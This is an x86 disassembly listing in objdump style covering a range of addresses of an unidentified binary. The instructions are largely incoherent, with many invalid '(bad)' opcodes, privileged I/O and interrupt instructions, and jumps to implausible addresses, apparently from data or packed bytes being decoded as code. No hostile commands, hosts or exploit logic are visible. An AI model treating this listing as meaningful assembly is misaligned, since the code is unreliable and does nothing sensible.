  4163ab:	inc    DWORD PTR [eax+0x331f82fb]
  4163b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4163b2:	adc    esi,DWORD PTR [eax-0x378ec3bb]
  4163b8:	adc    ebx,ecx
  4163ba:	push   eax
  4163bb:	and    edi,DWORD PTR [ecx]
  4163bd:	sub    edx,DWORD PTR [esi+0x46]
  4163c0:	mov    fs,WORD PTR [edx-0x3b]
  4163c3:	push   esi
  4163c4:	test   eax,0xd064a75
  4163c9:	cmp    BYTE PTR [esi-0x36],ah
  4163cc:	and    dh,BYTE PTR [eax]
  4163ce:	fnstsw WORD PTR [ebp-0x66]
  4163d1:	outs   dx,BYTE PTR ds:[esi]
  4163d2:	data16 lods al,BYTE PTR ds:[esi]
  4163d4:	jae    0x416423
  4163d6:	adc    esi,edi
  4163d8:	mov    eax,0xc6ff8193
  4163dd:	inc    eax
  4163de:	inc    esp
  4163df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4163e0:	push   ebp
  4163e1:	rcl    DWORD PTR [edi+0x4b010845],0x26
  4163e8:	mov    edx,0xd6e0ebb3
  4163ed:	mov    eax,ds
  4163ef:	shl    BYTE PTR [esi-0x30cb7ba7],cl
  4163f5:	cli    
  4163f6:	or     ecx,DWORD PTR [eax+0x65b9805c]
  4163fc:	(bad)  
  4163fd:	cmp    ebx,DWORD PTR ds:0xf27d0a7f
  416403:	push   cs
  416404:	push   ebx
  416405:	sub    BYTE PTR [eax+0x16],bh
  416408:	cli    
  416409:	add    DWORD PTR [edx+0x226c13dc],ebp
  41640f:	inc    bp
  416411:	inc    esp
  416412:	scas   eax,DWORD PTR es:[edi]
  416413:	into   
  416414:	push   ebp
  416415:	sbb    eax,0xdb09e722
  41641a:	stc    
  41641b:	mov    ds:0x2aa335df,al
  416420:	outs   dx,DWORD PTR ds:[si]
  416422:	(bad)  
  416423:	loop   0x4163cb
  416425:	inc    ebp
  416426:	ret    
  416427:	fwait
  416428:	or     esp,ebx
  41642a:	das    
  41642b:	std    
  41642c:	std    
  41642d:	jo     0x416449
  41642f:	neg    BYTE PTR [esi]
  416431:	ror    WORD PTR [ebx-0x2ac25ccf],cl
  416438:	or     al,0x44
  41643a:	jmp    0x4f370ebd
  41643f:	stos   DWORD PTR es:[edi],eax
  416440:	jl     0x41649e
  416442:	arpl   WORD PTR ds:0xbc396027,sp
  416448:	xchg   ebp,eax
  416449:	hlt    
  41644a:	push   esp
  41644b:	fnsave [ebx+ebp*1-0x3c]
  41644f:	dec    esp
  416450:	dec    esp
  416451:	push   cs
  416452:	cmp    al,0x73
  416454:	cmp    DWORD PTR [ebp+0xcff7da8],edi
  41645a:	adc    DWORD PTR [ecx],eax
  41645c:	jmp    0x41645e
  41645e:	(bad)  
  41645f:	dec    ebp
  416460:	pop    ds
  416461:	sub    eax,0x420f6b99
  416466:	mov    eax,ds:0x1c3d78f9
  41646b:	pop    esi
  41646c:	add    DWORD PTR [edx],edx
  41646e:	cmp    bh,bh
  416470:	rcl    DWORD PTR [edi+0x53274408],cl
  416476:	dec    eax
  416478:	arpl   WORD PTR [ebx-0x2aef1581],dx
  41647e:	fisubr WORD PTR [edx+0x4d]
  416481:	aaa    
  416482:	jge    0x41646c
  416484:	pop    esi
  416485:	mul    DWORD PTR [ecx-0x6c3b0e33]
  41648b:	and    DWORD PTR [ecx-0x7],edx
  41648e:	ret    
  41648f:	psubsb mm2,QWORD PTR cs:[esi]
  416493:	repz retf 0xb685
  416497:	out    dx,eax
  416498:	sbb    DWORD PTR [ebp-0x482c61f1],ebx
  41649e:	cs add al,0x42
  4164a1:	js     0x41645c
  4164a3:	out    dx,eax
  4164a4:	(bad)  
  4164a6:	jmp    0x4164fb
  4164a8:	mov    ah,0x8a
  4164aa:	int3   
  4164ab:	cmp    dl,BYTE PTR [edx-0x20]
  4164ae:	in     eax,0x3b
  4164b0:	shl    ebx,cl
  4164b2:	cs stos DWORD PTR es:[edi],eax
  4164b4:	xchg   edi,eax
  4164b5:	arpl   WORD PTR [ebx-0x78adb006],bp
  4164bb:	add    ebp,0x31
  4164be:	rcl    DWORD PTR [ebp+edi*2-0x6674193a],0xbc
  4164c6:	retf   0x9989
  4164c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4164ca:	inc    ebx
  4164cb:	and    ecx,DWORD PTR [edi]
  4164cd:	sahf   
  4164ce:	lds    esi,FWORD PTR [esi]
  4164d0:	push   0x557db3c1
  4164d5:	or     dh,BYTE PTR [ecx]
  4164d7:	sbb    eax,0xfbdef654
  4164dc:	mov    al,ds:0x986f9a16
  4164e1:	or     cl,BYTE PTR [esi]
  4164e3:	jae    0x41649a
  4164e5:	outs   dx,DWORD PTR ds:[esi]
  4164e6:	idiv   esi
  4164e8:	and    ebp,DWORD PTR es:[edi+0x32375bb5]
  4164ef:	test   BYTE PTR [eax+0x5b488bf1],al
  4164f5:	dec    ebx
  4164f6:	xor    ah,cl
  4164f8:	sbb    edx,DWORD PTR [ecx]
  4164fa:	rcl    DWORD PTR [eax-0x6f],cl
  4164fd:	inc    ecx
  4164fe:	xchg   DWORD PTR [esi-0x57768c77],ebp
  416504:	sar    bl,1
  416506:	inc    ebx
  416507:	jp     0x4164bd
  416509:	push   es
  41650a:	sar    bh,1
  41650c:	xchg   DWORD PTR [ebp+0x10afc12],eax
  416512:	xchg   edi,ebx
  416514:	in     eax,dx
  416515:	out    0x9a,eax
  416517:	or     ebp,0xffffff85
  41651a:	mov    esp,0x4113e9d4
  41651f:	sub    eax,0x63f74262
  416524:	mov    bh,0x93
  416526:	imul   ebx,DWORD PTR [edx],0x53698af8
  41652c:	iret   
  41652d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41652e:	xchg   ecx,eax
  41652f:	dec    esp
  416530:	mov    esp,0x92d40cdb
  416535:	mov    edx,0xc030d8f0
  41653a:	lods   eax,DWORD PTR ds:[esi]
  41653b:	sahf   
  41653c:	mov    ebp,0x7bbbc9cb
  416541:	mov    eax,0x448b93e4
  416546:	xchg   ebp,eax
  416547:	ds jo  0x416513
  41654a:	outs   dx,BYTE PTR ds:[esi]
  41654b:	in     eax,0xbb
  41654d:	mov    ebx,0xd0ac38ac
  416552:	inc    ecx
  416553:	(bad)  
  416554:	outs   dx,DWORD PTR ds:[esi]
  416555:	leave  
  416556:	repz dec ecx
  416558:	sahf   
  416559:	mov    esi,0x3ead2c93
  41655e:	xlat   BYTE PTR ds:[ebx]
  41655f:	mov    ecx,0xb85d848
  416564:	inc    ebp
  416565:	push   esp
  416566:	pushf  
  416567:	jbe    0x4165dc
  416569:	jae    0x4165de
  41656b:	sbb    al,0xf8
  41656d:	bound  edi,QWORD PTR [eax+eax*4+0x28757b36]
  416574:	outs   dx,DWORD PTR ds:[esi]
  416575:	mov    cl,0xbb
  416577:	pop    ebp
  416578:	pop    ss
  416579:	sbb    BYTE PTR [eax+0x28],0xc7
  41657d:	mov    dl,0xa5
  41657f:	leave  
  416580:	dec    esi
  416581:	ficomp WORD PTR [eax-0x5]
  416584:	inc    ecx
  416585:	or     al,0xd7
  416587:	ins    DWORD PTR es:[edi],dx
  416588:	retf   0x630f
  41658b:	mov    al,0x1d
  41658d:	or     al,0xf1
  41658f:	inc    ecx
  416590:	xchg   esp,eax
  416591:	(bad)  
  416592:	in     eax,0x8b
  416594:	and    BYTE PTR [ebx+edi*2+0x1e76b7f3],ah
  41659b:	jg     0x4165bc
  41659d:	mov    ah,0xb6
  41659f:	xchg   ecx,eax
  4165a0:	push   ebx
  4165a1:	dec    esi
  4165a2:	ficomp DWORD PTR [ebx-0x38c56d7a]
  4165a8:	inc    esp
  4165a9:	mov    al,BYTE PTR [eax+0x6bce2c2e]
  4165af:	push   es
  4165b0:	cdq    
  4165b1:	repnz or al,0x6f
  4165b4:	fxch   st(7)
  4165b6:	test   al,0x79
  4165b8:	dec    eax
  4165b9:	dec    ebp
  4165ba:	test   BYTE PTR [esi],dh
  4165bc:	ja     0x416638
  4165be:	push   ecx
  4165bf:	jmp    0x41654f
  4165c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4165c2:	mov    cl,0x1e
  4165c4:	add    BYTE PTR [eax-0xf],dl
  4165c7:	std    
  4165c8:	xchg   edx,eax
  4165c9:	(bad)  
  4165ca:	fdivr  QWORD PTR [esi+esi*1+0x354d4f86]
  4165d1:	imul   eax,edx,0xaf34ca81
  4165d7:	clc    
  4165d8:	leave  
  4165d9:	xor    edi,ecx
  4165db:	jecxz  0x416576
  4165dd:	ja     0x41656b
  4165df:	fld    DWORD PTR [eax]
  4165e1:	ss dec ecx
  4165e3:	outs   dx,BYTE PTR ds:[esi]
  4165e4:	jmp    0x3bd6acf6
  4165e9:	mov    ah,0xb7
  4165eb:	enter  0x9117,0x21
  4165ef:	sub    eax,0x38f64aad
  4165f4:	lahf   
  4165f5:	(bad)  
  4165f6:	ss retf 0xac40
  4165fa:	pop    ds
  4165fb:	je     0x4165b6
  4165fd:	sahf   
  4165fe:	mov    al,ds:0xf297d954
  416603:	mov    eax,0x36da7226
  416608:	mov    bh,ch
  41660a:	mov    ebx,DWORD PTR [esi+0x356ee628]
  416610:	jae    0x4165e1
  416612:	lods   al,BYTE PTR ds:[esi]
  416613:	cmc    
  416614:	dec    eax
  416615:	push   ebp
  416616:	repz sbb DWORD PTR [esi+ebp*4+0x32b07253],esp
  41661e:	dec    esi
  41661f:	in     eax,0x80
  416621:	int    0x98
  416623:	test   al,0x79
  416625:	out    dx,eax
  416626:	add    dl,dl
  416628:	ret    
  416629:	and    edx,ebp
  41662b:	mov    edi,eax
  41662d:	xchg   edi,ebp
  41662f:	xor    esi,DWORD PTR ds:0x758871e
  416635:	ins    BYTE PTR es:[edi],dx
  416636:	retf   0xd6c4
  416639:	pusha  
  41663a:	sahf   
  41663b:	add    dh,BYTE PTR fs:[esi-0x430dd907]
  416642:	sub    eax,DWORD PTR [eax+0xb8d891c]
  416648:	jne    0x4165f2
  41664a:	or     al,dh
  41664c:	jg     0x416649
  41664e:	xor    eax,DWORD PTR [ebx+0x20]
  416651:	and    eax,0x1c798d36
  416656:	xor    BYTE PTR [ebx-0x1a54663],ah
  41665c:	mov    ebx,0xb8257614
  416661:	outs   dx,DWORD PTR ds:[esi]
  416662:	or     DWORD PTR [edi],ebp
  416664:	xor    al,0x63
  416666:	pop    ds
  416667:	mov    ?,WORD PTR [edx+edi*2+0x28767494]
  41666e:	fild   DWORD PTR [esi-0x7a]
  416671:	pusha  
  416672:	cmp    al,0xed
  416674:	in     eax,0x52
  416676:	mov    DWORD PTR [edx],ebp
  416678:	int    0xc
  41667a:	hlt    
  41667b:	add    al,0xc1
  41667d:	mul    BYTE PTR [ebx+eax*8]
  416680:	rcl    DWORD PTR [ebp+0x72bc0183],0x4c
  416687:	int    0x5a
  416689:	jmp    0x9aba:0x49c59295
  416690:	outs   dx,BYTE PTR ds:[esi]
  416691:	fnsave [eax+0x31]
  416694:	mov    ah,0xae
  416696:	in     al,dx
  416697:	ins    DWORD PTR es:[edi],dx
  416698:	push   esi
  416699:	mov    ds:0x2c19bc2e,eax
  41669e:	dec    ebx
  41669f:	sub    eax,0x1c797b31
  4166a4:	mov    dh,0xf5
  4166a6:	xor    al,0x37
  4166a8:	mov    bh,0xa2
  4166aa:	cmp    dh,BYTE PTR [edi+0x462b57ae]
  4166b0:	aam    0x34
  4166b2:	mov    ds:0x574b8c5e,eax
  4166b7:	mov    bh,0x16
  4166b9:	fs push edi
  4166bb:	sbb    eax,0xb50378f9
  4166c0:	mov    esp,0x8c9ed8ca
  4166c5:	inc    ecx
  4166c6:	push   ss
  4166c7:	dec    edx
  4166c8:	mov    ebp,0x7a041329
  4166cd:	fdiv   QWORD PTR ds:0x947b4b78
  4166d3:	je     0x41665f
  4166d5:	fdiv   QWORD PTR [ecx+ebp*8+0x51]
  4166d9:	or     BYTE PTR [edi],dh
  4166db:	add    BYTE PTR [edi+0x63350759],ah
  4166e1:	dec    DWORD PTR [eax-0x5b72c612]
  4166e7:	sbb    al,dl
  4166e9:	and    edx,esp
  4166eb:	stos   DWORD PTR es:[edi],eax
  4166ec:	xchg   BYTE PTR [edi+0xc2a3c21],cl
  4166f2:	mov    ah,dh
  4166f4:	retf   
  4166f5:	xor    DWORD PTR [edi-0x76ad760f],ebp
  4166fb:	retf   
  4166fc:	pop    ecx
  4166fd:	add    esi,DWORD PTR [edi-0x61503781]
  416703:	mov    ds:0x233dd16e,eax
  416708:	pop    eax
  416709:	ins    BYTE PTR es:[edi],dx
  41670a:	daa    
  41670b:	push   ds
  41670c:	(bad)  
  41670d:	sub    al,0xca
  41670f:	imul   ecx,DWORD PTR [ebp+0x26],0x2a
  416713:	imul   edi,DWORD PTR [eax-0x4b17af8e],0xa3cbcb23
  41671d:	mov    edi,0x1917ac8a
  416722:	outs   dx,DWORD PTR ds:[esi]
  416723:	inc    ecx
  416724:	pop    edx
  416725:	jmp    0x1d465bc6
  41672a:	dec    ebx
  41672b:	test   DWORD PTR [esi+0x5a],esi
  41672e:	xchg   edx,eax
  41672f:	lods   al,BYTE PTR ds:[esi]
  416730:	dec    esp
  416731:	outs   dx,DWORD PTR ds:[esi]
  416732:	push   edi
  416733:	mov    ah,0xee
  416735:	mov    ds:0x36ee34b,al
  41673a:	add    ebx,DWORD PTR [esi+0xe]
  41673d:	xor    al,0xb9
  41673f:	sbb    al,dh
  416741:	mov    bl,0xc6
  416743:	pop    ebp
  416744:	stos   BYTE PTR es:[edi],al
  416745:	sub    ch,dl
  416747:	or     dl,BYTE PTR [ebx-0x18b0d692]
  41674d:	dec    ebx
  41674e:	dec    ebp
  41674f:	mov    WORD PTR [ecx-0x63330479],ds
  416755:	sbb    al,ah
  416757:	sub    ebx,ebp
  416759:	or     DWORD PTR fs:[ebx+0x34],0x3a
  41675e:	sub    dl,BYTE PTR [edx-0x4e]
  416761:	or     dl,BYTE PTR [ebx+0x5c]
  416764:	loop   0x41670c
  416766:	or     dl,bl
  416768:	and    DWORD PTR [edi-0x13d840f5],ebx
  41676e:	xchg   esi,eax
  41676f:	les    eax,FWORD PTR [ecx+0x10]
  416772:	pop    ebx
  416773:	lea    ebp,[edx-0x42]
  416776:	pushf  
  416777:	add    eax,0xd6c745c8
  41677c:	sbb    ecx,DWORD PTR [eax+0x362a5945]
  416782:	push   esi
  416783:	ja     0x41678e
  416785:	sub    eax,0xa170bbc9
  41678a:	xchg   esp,eax
  41678b:	lods   al,BYTE PTR ds:[esi]
  41678c:	fbstp  TBYTE PTR ds:0xf42b078b
  416792:	shl    DWORD PTR [ecx],0xd6
  416795:	dec    ebx
  416796:	fistp  DWORD PTR [esi-0x20]
  416799:	cmp    BYTE PTR [ebp+0x72],bh
  41679c:	pop    es
  41679d:	not    DWORD PTR [esi]
  41679f:	jle    0x41680b
  4167a1:	add    dh,al
  4167a3:	push   ss
  4167a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4167a5:	push   ds
  4167a6:	xchg   ecx,eax
  4167a7:	loope  0x4167aa
  4167a9:	cmp    BYTE PTR [ecx],cl
  4167ab:	push   ecx
  4167ac:	pop    ds
  4167ad:	dec    esi
  4167ae:	or     BYTE PTR [ebp-0x77d60c82],dl
  4167b4:	xlat   BYTE PTR ds:[ebx]
  4167b5:	pusha  
  4167b6:	xchg   DWORD PTR [ebx+0x67],esi
  4167b9:	jns    0x41673e
  4167bb:	(bad)  
  4167bc:	jmp    0x416782
  4167be:	push   ebx
  4167bf:	xchg   ebx,eax
  4167c0:	jnp    0x41682a
  4167c2:	fsubr  DWORD PTR fs:[esi-0x5]
  4167c6:	shr    BYTE PTR [ecx-0x4d9f61ab],1
  4167cc:	nop
  4167cd:	aam    0x36
  4167cf:	push   esp
  4167d0:	inc    esp
  4167d1:	call   0x59fa5ac3
  4167d6:	enter  0x7b36,0x23
  4167da:	sbb    DWORD PTR [esi-0x63dc52bd],esp
  4167e0:	inc    edi
  4167e1:	mov    cl,0xab
  4167e3:	rol    DWORD PTR [edx+edi*2+0x14798913],1
  4167ea:	jae    0x416787
  4167ec:	jge    0x4167ff
  4167ee:	dec    edi
  4167ef:	cmp    bh,al
  4167f1:	jl     0x41678c
  4167f3:	shr    esi,1
  4167f5:	(bad)  ss:[esi-0x3260c9ed]
  4167fc:	and    bh,dh
  4167fe:	pop    esp
  4167ff:	add    cl,ch
  416801:	test   eax,0x25bdbee7
  416806:	jp     0x416869
  416808:	stos   DWORD PTR es:[edi],eax
  416809:	(bad)  
  41680a:	dec    esi
  41680b:	sub    BYTE PTR [edx],0x20
  41680e:	mov    esi,0x1d3da474
  416813:	das    
  416814:	sub    DWORD PTR [edx-0x4cde6504],edx
  41681a:	in     eax,dx
  41681b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41681c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41681d:	adc    edx,0x38
  416820:	adc    dl,BYTE PTR [eax]
  416822:	cmp    BYTE PTR [ebx],ch
  416824:	mov    ah,0xe1
  416826:	pushf  
  416827:	imul   edi,DWORD PTR [eax+esi*2],0xbef57561
  41682e:	mov    ebx,0xcb06234e
  416833:	(bad)  
  416834:	mov    bl,0xe7
  416836:	jmp    0x3eeefe09
  41683b:	pop    ds
  41683c:	out    0xbb,eax
  41683e:	cs call 0x7f8f1614
  416844:	adc    DWORD PTR [edx-0x79],ecx
  416847:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416848:	sbb    bh,bl
  41684a:	push   0xfffffffe
  41684c:	adc    eax,0xc3049f07
  416851:	int    0x92
  416853:	sub    eax,0x7aaa162e
  416858:	loop   0x416832
  41685a:	adc    edx,DWORD PTR [edx+0x6fe5b6]
  416860:	and    al,BYTE PTR [ebp+0x30]
  416863:	into   
  416864:	in     eax,0xee
  416866:	clc    
  416867:	and    edi,0xffffff8f
  41686a:	sbb    BYTE PTR [edi+0x44],dl
  41686d:	mov    ah,BYTE PTR [edi]
  41686f:	push   edi
  416870:	mov    ds:0x1912feaf,al
  416875:	push   0xf40c2b69
  41687a:	fidivr DWORD PTR [esi]
  41687c:	retf   0xc524
  41687f:	add    edi,DWORD PTR [esi-0x47a494f0]
  416885:	cmp    dl,dl
  416887:	pop    ds
  416888:	lds    edi,FWORD PTR [ebp+0x3b]
  41688b:	leave  
  41688c:	mov    ebx,0xff0c4605
  416891:	push   ebx
  416892:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416893:	pushf  
  416894:	(bad)  
  416895:	or     cl,BYTE PTR [ecx+0x5]
  416898:	pushf  
  416899:	ret    
  41689a:	ss or  al,0xb3
  41689d:	fimul  WORD PTR [ecx]
  41689f:	adc    DWORD PTR [ecx-0x31],ebx
  4168a2:	ss push ecx
  4168a4:	fwait
  4168a5:	mov    eax,0x9539fe0c
  4168aa:	stc    
  4168ab:	jmp    0x505d00b4
  4168b0:	cdq    
  4168b1:	mov    bh,0x1d
  4168b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4168b4:	mov    bl,0xb8
  4168b6:	and    eax,0x91d8c021
  4168bb:	xchg   esi,eax
  4168bc:	sub    cl,dh
  4168be:	jmp    0x3ea6ac35
  4168c3:	rol    BYTE PTR [eax+0x3c31dd8d],1
  4168c9:	add    al,BYTE PTR [ecx+ecx*4-0x7]
  4168cd:	cs scas al,BYTE PTR es:[edi]
  4168cf:	rcr    BYTE PTR [ebp+0x4b398146],cl
  4168d5:	pop    edx
  4168d6:	cmc    
  4168d7:	dec    esi
  4168d8:	cmp    dh,BYTE PTR [ebx-0x77]
  4168db:	fbld   TBYTE PTR [edi+edx*4-0x5c]
  4168df:	outs   dx,BYTE PTR ds:[esi]
  4168e0:	mov    ecx,0x1ef03234
  4168e5:	int3   
  4168e6:	es xor eax,0x3fe8952d
  4168ec:	(bad)  
  4168ed:	call   0xd781:0xbdf02193
  4168f4:	xor    al,BYTE PTR [ebx]
  4168f6:	jl     0x416929
  4168f8:	mov    ds:0xc05ff289,al
  4168fd:	hlt    
  4168fe:	nop    DWORD PTR ds:0xd7028c63
  416905:	mov    eax,ds:0xc949797f
  41690a:	mov    ebp,0xedf09d90
  41690f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416910:	(bad)  
  416913:	sub    BYTE PTR [edx],ch
  416915:	aaa    
  416916:	pop    ds
  416917:	cli    
  416918:	pop    eax
  416919:	inc    edx
  41691a:	mov    dh,0xd8
  41691c:	xor    eax,0xe693ed98
  416921:	sbb    al,0x5e
  416923:	jecxz  0x416923
  416925:	add    cl,BYTE PTR [esi+0x34]
  416928:	push   ebp
  416929:	and    ebp,ecx
  41692b:	dec    ebx
  41692c:	sbb    ebp,eax
  41692e:	(bad)  
  41692f:	aam    0xf0
  416931:	aaa    
  416932:	or     dl,BYTE PTR [esi]
  416934:	xchg   esp,eax
  416935:	lahf   
  416936:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416937:	push   ecx
  416938:	cwde   
  416939:	icebp  
  41693a:	and    BYTE PTR [ebp+ecx*4+0x1a],dl
  41693e:	mov    ah,0xfd
  416940:	mov    ds,WORD PTR [esi-0x7]
  416943:	sahf   
  416944:	jg     0x416907
  416946:	shl    DWORD PTR [esp+edx*4-0x32e4ee3b],1
  41694d:	out    0xc0,al
  41694f:	push   ebp
  416950:	rcr    BYTE PTR [esi+edi*2+0x172f1321],0x8d
  416958:	add    edi,edx
  41695a:	add    bl,BYTE PTR [edx-0x6e]
  41695d:	lods   al,BYTE PTR ds:[esi]
  41695e:	or     al,0x28
  416960:	and    BYTE PTR [ebx],ch
  416962:	shl    BYTE PTR [edx-0x3f163a93],cl
  416968:	xchg   esi,eax
  416969:	cmp    bl,BYTE PTR [edx]
  41696b:	fisttp DWORD PTR [edx]
  41696d:	jg     0x41696f
  41696f:	imul   edi,DWORD PTR [eax-0x4395c617],0xffffffcd
  416976:	test   bl,0x8e
  416979:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41697a:	xor    al,0x58
  41697c:	mov    al,ds:0xea80637f
  416981:	inc    ecx
  416982:	test   al,0x23
  416984:	jb     0x4169f4
  416986:	mov    ds:0xca32b39f,al
  41698b:	mov    esi,DWORD PTR [ebx+eiz*2+0x4f]
  41698f:	pop    edi
  416990:	in     eax,dx
  416991:	push   edx
  416992:	xor    ecx,DWORD PTR [ecx-0x6e68d293]
  416998:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416999:	sub    ch,bl
  41699b:	and    edx,edx
  41699d:	imul   eax,ecx,0xb6aa4ebc
  4169a3:	int3   
  4169a4:	stos   DWORD PTR es:[edi],eax
  4169a5:	add    eax,0x881708f6
  4169aa:	mov    ch,0x60
  4169ac:	jno    0x416a24
  4169ae:	pop    edi
  4169af:	jmp    0x63c3f9f3
  4169b4:	(bad)  
  4169b5:	fst    QWORD PTR [ebx+ebx*4+0x5396d4ab]
  4169bc:	fsubr  st,st(6)
  4169be:	xchg   edx,eax
  4169bf:	sti    
  4169c0:	sbb    dh,BYTE PTR [esi+eax*8]
  4169c3:	(bad)  
  4169c4:	aad    0x90
  4169c6:	xor    DWORD PTR [edx+0x40],esi
  4169c9:	js     0x41698f
  4169cb:	aas    
  4169cc:	mov    cl,0x6a
  4169ce:	xchg   esi,eax
  4169cf:	fsub   QWORD PTR [ebx]
  4169d1:	int    0x57
  4169d3:	jns    0x416a11
  4169d5:	pushf  
  4169d6:	hlt    
  4169d7:	shl    ebp,cl
  4169d9:	inc    esi
  4169da:	sub    esi,esp
  4169dc:	shl    BYTE PTR fs:[ebp+0x2c8fdd7c],cl
  4169e3:	(bad)  
  4169e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4169e5:	sub    DWORD PTR [edx-0x99e3a0b],edx
  4169eb:	pushf  
  4169ec:	fs push ebx
  4169ee:	es push ebp
  4169f0:	fs inc ecx
  4169f2:	adc    DWORD PTR [edi],edx
  4169f4:	in     al,dx
  4169f5:	jno    0x416a68
  4169f7:	xchg   DWORD PTR [edi],ebx
  4169f9:	inc    edi
  4169fa:	clc    
  4169fb:	pop    es
  4169fc:	sbb    BYTE PTR [eax-0x50],0x1e
  416a00:	pop    edx
  416a01:	popa   
  416a02:	adc    al,0xe3
  416a04:	fist   DWORD PTR [ebx+0x30]
  416a07:	addr16 ret 0x4abf
  416a0b:	out    dx,eax
  416a0c:	shl    DWORD PTR [esi-0x6507e48b],1
  416a12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416a13:	sbb    BYTE PTR ds:0xc451e27e,dh
  416a19:	or     bl,bl
  416a1b:	aaa    
  416a1c:	inc    eax
  416a1d:	imul   eax,DWORD PTR [ecx-0x3aceed72],0x461206e8
  416a27:	and    edi,ebp
  416a29:	mov    ds:0xffd4cc7,al
  416a2e:	cmc    
  416a2f:	sub    al,0x4b
  416a31:	sub    eax,0x7ab5d027
  416a36:	mov    edx,ebx
  416a38:	pushf  
  416a39:	mov    bl,0xeb
  416a3b:	sub    ah,BYTE PTR [esi-0x74]
  416a3e:	into   
  416a3f:	(bad)  
  416a40:	fadd   DWORD PTR [esi+0x619d523]
  416a46:	not    BYTE PTR [ebx-0x6]
  416a49:	in     al,0x35
  416a4b:	xchg   ah,al
  416a4d:	inc    ecx
  416a4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416a4f:	stc    
  416a50:	or     edx,DWORD PTR [edi+0x76]
  416a53:	leave  
  416a54:	mov    ebp,0xfa0777a0
  416a59:	test   al,0x40
  416a5b:	or     al,0x72
  416a5d:	sbb    eax,0x8b6ac6cc
  416a62:	push   DWORD PTR [ecx-0x4e652647]
  416a68:	clc    
  416a69:	and    al,0x65
  416a6b:	mov    dl,0x65
  416a6d:	cmp    BYTE PTR [edx-0x1f],dl
  416a70:	push   ebx
  416a71:	push   ebp
  416a72:	mov    esp,DWORD PTR [ecx+0xe]
  416a75:	xor    eax,0x112de5d7
  416a7a:	dec    ebx
  416a7b:	push   ebp
  416a7c:	leave  
  416a7d:	cmp    al,0xa2
  416a7f:	stos   BYTE PTR es:[edi],al
  416a80:	jno    0x416a45
  416a82:	call   FWORD PTR [eax+0x2c]
  416a85:	(bad)
  416a88:	loopne 0x416a46
  416a8a:	mov    ebx,0x46a61c25
  416a8f:	arpl   WORD PTR [eax+0x23],bx
  416a92:	jo     0x416ae0
  416a94:	sti    
  416a95:	adc    WORD PTR [edx+0x4],sp
  416a99:	mov    WORD PTR [esi],cs
  416a9b:	jecxz  0x416ae8
  416a9d:	out    dx,al
  416a9e:	jnp    0x416aa9
  416aa0:	xchg   edi,eax
  416aa1:	pushf  
  416aa2:	aad    0x6d
  416aa4:	adc    al,0x6c
  416aa6:	lahf   
  416aa7:	push   eax
  416aa8:	mov    ch,ch
  416aaa:	stc    
  416aab:	add    edi,DWORD PTR [ebx]
  416aad:	dec    eax
  416aae:	sub    al,0x22
  416ab0:	aam    0x1e
  416ab2:	or     DWORD PTR [esi+0x6fab9ae8],0x766b14bb
  416abc:	rcr    ebp,cl
  416abe:	pusha  
  416abf:	hlt    
  416ac0:	xlat   BYTE PTR ds:[ebx]
  416ac1:	add    al,0x94
  416ac3:	or     BYTE PTR [ecx+eiz*8],dh
  416ac6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416ac7:	cmc    
  416ac8:	les    ebx,FWORD PTR [ebp+edx*2-0x25]
  416acc:	mov    bl,0x2d
  416ace:	and    edx,DWORD PTR [ecx]
  416ad0:	xchg   edx,eax
  416ad1:	cmp    BYTE PTR [edx],cl
  416ad3:	nop
  416ad4:	xchg   BYTE PTR [edi+0x35],bl
  416ad7:	retf   0x71ee
  416ada:	cmp    eax,0xf7c85df
  416adf:	addr16 mov al,0xee
  416ae2:	pop    ebp
  416ae3:	dec    ebp
  416ae4:	mov    esp,0x404c5140
  416ae9:	cmc    
  416aea:	out    0xc2,eax
  416aec:	jmp    0x416b61
  416aee:	mov    ebx,0x55b1bfc1
  416af3:	dec    esi
  416af4:	dec    ebx
  416af5:	sahf   
  416af6:	scas   eax,DWORD PTR es:[edi]
  416af7:	push   esp
  416af8:	push   ss
  416af9:	inc    eax
  416afa:	pop    edi
  416afb:	gs test eax,0x96e63385
  416b01:	enter  0xae0a,0xc5
  416b05:	fisub  WORD PTR [ecx+0x6b]
  416b08:	and    al,0x79
  416b0a:	cs jno 0x416af0
  416b0d:	retf   0x3a04
  416b10:	mov    ds:0x87407761,al
  416b15:	loopne 0x416b46
  416b17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416b18:	add    edi,ebx
  416b1a:	mov    edx,0xebdc8bed
  416b1f:	sar    esp,0xac
  416b22:	js     0x416b5a
  416b24:	shr    edx,1
  416b26:	imul   DWORD PTR [ebx+eiz*2-0x4]
  416b2a:	xchg   esp,eax
  416b2b:	jnp    0x416b9f
  416b2d:	or     DWORD PTR [edx-0x3b],esp
  416b30:	add    eax,0xbb8053cb
  416b35:	in     al,dx
  416b36:	out    dx,al
  416b37:	ror    DWORD PTR [eax-0x7b65f6d4],cl
  416b3d:	sbb    ah,bl
  416b3f:	mov    bl,0xe6
  416b41:	jp     0x416b50
  416b43:	cld    
  416b44:	out    0x35,eax
  416b46:	data16 shr BYTE PTR [ebp+0x72693556],0x28
  416b4e:	out    dx,eax
  416b4f:	cmp    al,0x58
  416b51:	mov    esi,0xffb636af
  416b56:	mov    cl,0x30
  416b58:	(bad)  
  416b59:	adc    DWORD PTR [esi],eax
  416b5b:	repz pop eax
  416b5d:	sbb    al,BYTE PTR [ebx]
  416b5f:	call   0xe6866472
  416b64:	aaa    
  416b65:	aad    0xdd
  416b67:	push   edi
